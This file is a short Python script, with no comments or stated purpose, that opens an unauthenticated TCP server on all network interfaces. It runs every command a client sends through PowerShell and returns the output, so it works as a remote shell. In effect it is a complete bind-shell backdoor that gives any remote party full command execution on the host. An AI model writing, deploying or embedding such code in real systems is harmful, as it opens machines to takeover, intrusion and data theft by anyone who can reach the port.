import socket
import threading
import subprocess
import os

HOST = '0.0.0.0'
PORT = 8080

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(5)

print(f"Server is listening on {HOST}:{PORT}")

def send_msg(sock, msg):
    msg_encoded = msg.encode()
    msg_length = len(msg_encoded)
    msg_length_encoded = msg_length.to_bytes(4, 'big')
    sock.sendall(msg_length_encoded)
    sock.sendall(msg_encoded)

def recv_msg(sock):
    msg_length_encoded = sock.recv(4)
    if not msg_length_encoded:
        return None
    msg_length = int.from_bytes(msg_length_encoded, 'big')
    msg_encoded = sock.recv(msg_length)
    return msg_encoded.decode()

def handle_client(client_socket):
    working_dir = os.getcwd()
    while True:
        try:
            command = recv_msg(client_socket)
            if not command:
                break

            if command.startswith("cd "):
                try:
                    new_dir = os.path.join(working_dir, command.split(' ', 1)[1])
                    os.chdir(new_dir)
                    working_dir = os.getcwd()
                    response = f"Changed directory to {working_dir}"
                except Exception as e:
                    response = f"Error changing directory: {e}"
            else:
                result = subprocess.run(['powershell', '-NoProfile', '-Command', command], cwd=working_dir, capture_output=True, text=True)
                response = result.stdout + result.stderr
                if not response:
                    response = "Command executed with no output."

            send_msg(client_socket, response)

        except socket.error as e:
            print(f"Socket error: {e}")
            break

    client_socket.close()

while True:
    client_socket, _ = server_socket.accept()
    client_thread = threading.Thread(target=handle_client, args=(client_socket,))
    client_thread.start()
